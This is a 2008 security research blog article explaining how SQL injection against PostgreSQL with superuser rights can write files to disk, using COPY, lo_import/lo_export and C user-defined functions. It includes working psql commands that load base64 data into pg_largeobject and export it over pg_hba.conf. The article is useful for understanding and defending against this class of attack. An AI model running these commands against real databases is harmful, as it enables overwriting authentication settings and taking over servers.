SQLi: Writing files to disk under PostgreSQL
#############################################
:date: 2008-12-21 15:03
:author: jekil
:category: Research
:tags: exploiting, PostgreSQL, SQL Injection, SQLi, writing file
:slug: sqli-writing-files-to-disk-under-postgresql
:status: published
:alias: /paper/sqli-writing-files-to-disk-under-postgresql

Table of Contents
-----------------

| 1. Introduction
| 2. Default configuration
| 3. COPY Function
| 3.1 COPY function abusing
| 4. BLOB functions
| 4.1 BLOB functions abusing
| 5. User defined functions
| 5.1 User defined functions abusing
| 6. Conclusions
| 7. References

1. Introduction
---------------

The following examples assume access to the database has been achieved
through SQL Injection vulnerability in a web application.

Sometimes, against best practice, the application has connected to the
database using superuser credentials.

2. Default configuration
------------------------

In some systems the configuration files of PostgreSQL are owned by the
user used to run the PostgreSQL process.

For example in my Ubuntu laptop the PostgreSQL configuration file are
owned by postgres by default, as you can see:

.. code-block:: console

    $ ls -al /etc/postgresql/8.3/main/
    total 44
    drwxr-xr-x 2 root     root      4096 2008-05-14 00:20 .
    drwxr-xr-x 3 root     root      4096 2008-04-12 15:19 ..
    -rw-r--r-- 1 root     root       316 2008-04-12 15:20 environment
    -rw-r----- 1 postgres postgres  3845 2008-05-13 23:07 pg_hba.conf
    -rw-r----- 1 postgres postgres  1460 2008-04-12 15:20 pg_ident.conf
    -rw-r--r-- 1 postgres postgres 16682 2008-04-12 15:20 postgresql.conf
    -rw-r--r-- 1 root     root       378 2008-04-12 15:20 start.conf

All the configuration files are owned by postgres user which can write
these.

So anyone that can execute a SQL statement that write files to disk can
try to overwrite a configuration file and do all evil things.

3. COPY Function
----------------

The COPY statement transfers data between PostgreSQL tables and standard
file system files.

COPY TO statement copies the contents of a table to a file, while COPY
FROM copies data from a file to a table (appending the data to whatever
is in the table already).

It can export data as text or PostgreSQL's own binary format, which
contains a header.

Using COPY with a file name instructs the PostgreSQL server to directly
read from or write to a file. The file must be accessible to the server
and the name must be specified from the viewpoint of the server. When
STDIN or STDOUT is specified, data is transmitted via the connection
between the client and the server.

In PostgreSQL 8.0 and later the database file locations can be
determined querying system table pg\_settings:

.. code-block:: psql

    postgres=# SELECT setting FROM pg_settings WHERE name='data_directory';
    setting
    ------------------------------
    /var/lib/postgresql/8.3/main
    (1 row)

3.1 COPY function abusing
-------------------------

The files are accessed under the operating system user privilege that
the database runs as and it's available only to database superusers.

The COPY command does not accept relative paths to prevent the
overwriting of a database file, more explanation of this can be found in
copy.c source file.

So an attacker can use ~ to write in PostgreSQL home directory and must
write files in already known path or a well known directory like /tmp.

The caveat is that the file cannot contain a null byte (0x00) otherwise
proceeding bytes will not be written out.

4. BLOB functions
-----------------

PostgreSQL uses large objects, also called Binary Large Objects, to
store very large values and binary data. Large objects permit storage of
any operating system file, including images or large text files,
directly into the database.

It has provided support for BLOB, also called Large Objects, since
version 4.2. From version 7.2 organized the three large object
interfaces such that all large objects are now placed in the system
table pg\_largeobject.

According to the Database Data Type Comparison Sheet[3] there are two
data types used by PostgreSQL to store BLOB:

* BYTEA: used to store small amount of binary data that are stored in the data table
* OID: used to store very large amount of binary data in form of file in the filesystem

4.1 BLOB functions abusing
--------------------------

The file is loaded into the database using lo\_import(), and is
retrieved from the database using lo\_export(). These functions take a
path as argument that is the path of file to load or the path where
export the data in the BLOB field.

In detail[2] to export a large object into an operating system file,
call the lo\_export() function, with argument that specifies the
operating system name of the file.

Note that the file is written by the client interface library, not by
the server. Returns 1 on success, -1 on failure.

Reading PostgreSQL documentation in the BLOB section[1] there is the
following:

    Files are imported and exported by the postgres user, so postgres must have
    permission to read the file for lo_import() and directory write permission for
    lo_export().

So this function can write a file to disk and abusing it we can
overwrite the PostgreSQL configuration files.

First of all we need to create a temporary table (if your user have
right permissions) to store our evil data:

.. code-block:: psql

    postgres=# CREATE TABLE foo (
    postgres(# bar oid,
    postgres(# id int4,
    postgres(# CONSTRAINT id PRIMARY KEY (id) ) WITHOUT OIDS;
    NOTICE:  CREATE TABLE / PRIMARY KEY will create implicit index "id" for table "foo"
    CREATE TABLE

The easiest way to load a file is using lo\_import() that imports a file
from the local file system but if you want to use this you must have a
way to store a file on target system.

.. code-block:: psql

    postgres=# INSERT INTO foo VALUES (lo_import('/tmp/bar.bin'), 1);
    INSERT 0 1

Now you can try to abuse of lo\_export() to overwrite a PostgreSQL
configuration file.

If the web application connects to PostgreSQL using a user with
superuser permission you can overwrite any configuration file owned by
postgres, here we overwrite pg\_hba.conf:

.. code-block:: psql

    postgres=# SELECT lo_export(bar, '/etc/postgresql/8.3/main/pg_hba.conf') FROM
    postgres+# foo WHERE id=1;
    lo_export
    -----------
    1
    (1 row)

If the web application runs as a non-superuser user you can get the
following error message:

    Query failed: ERROR: must be superuser to use server-side lo_export() HINT:
    Anyone can use the client-side lo_export() provided by libpq.

If you are exploiting a SQL injection you can't use lo\_import() because
it needs to write files in the local system the pg\_largeobject table
can be queried and updated directly, it's "data" column is the
equivalent to the BLOB data type found in other DBMS and is of type
BYTEA.

Remember that when writing BYTEA data all non printable characters must
be represented in octal syntax like 00 and the \\ must be escaped if you
use it inside a string.

For example 00 becomes 0 inside a string.

A trick is to transfer data encoded in hex or base64 and then decode it
in the database, but remember that this cause an overhead, for example
of 34% of the file size using base64.

Using direct access to pg\_largeobject we can transfer an arbitrary file
and then exporting it via lo\_export().

First of all you must create a new entry in pg\_largeobject.

.. code-block:: psql

    postgres=# SELECT lo_create(-1);
    lo_create
    ----------
    24586
    (1 row)

And now load your file encoded in base64 (also hex encoding can be
used).

.. code-block:: psql

    postgres=# UPDATE pg_largeobject SET data = (DECODE('YW50YW5p', 'base64'))
    postgres+# WHERE LOID = 24586;
    UPDATE 1

Your file is loaded in the target DBMS, now you can write it to disk
using lo\_export().

.. code-block:: psql

    postgres=# SELECT lo_export(24586, '/etc/postgresql/8.3/main/pg_hba.conf');
    lo_export
    -----------
    1
    (1 row)

5. User defined functions
-------------------------

The PostgreSQL functionalities can be extended user-defined functions,
data types, triggers, etc[6] written in C or other languages.

By default only superuser can create new functions using language C.

5.1 User defined functions abusing
----------------------------------

Using a user-defined function is possible to define function to open,
create and write files.

The code is not too short and described by Nico Leidecker[5] and also is
the author of pgshell[7], a tool to automatize the exploitation process.

6. Conclusions
--------------

Exploiting a SQL injection to write files in to the attacked system disk
can be done in three ways but as you can see in the following comparison
table you can do it only if the database user is a superuser.

+-------------------------------+-------------+------+
|                               | Super user  | User |
+-------------------------------+-------------+------+
|    Write files with COPY      |    YES      |  NO  |
+-------------------------------+-------------+------+
| Write files with lo_export()  |    YES      |  NO  |
+-------------------------------+-------------+------+
|   Write file via extension    |    YES      |  NO  |
+-------------------------------+-------------+------+

So in the case we aren't superuser a privilege escalation
vulnerability can be user to upload files.
If you achieve the capability to upload files you can overwrite the
PostgreSQL configuration files.

**7. References**

| [1]
  http://www.postgresql.org/files/documentation/books/aw_pgsql/node96.html
| [2] http://www.postgresql.org/docs/8.3/interactive/lo-interfaces.html
| [3]
  http://www.lonerunners.net/1246-database-datatype-comparison-sheet.html
| [4] http://www.postgresql.org/docs/8.1/interactive/sql-copy.html
| [5]
  http://labs.portcullis.co.uk/download/Having_Fun_With_PostgreSQL.pdf
| [6]
  http://www.postgresql.org/docs/8.3/interactive/server-programming.html
| [7] http://www.leidecker.info/projects/pgshell.shtml
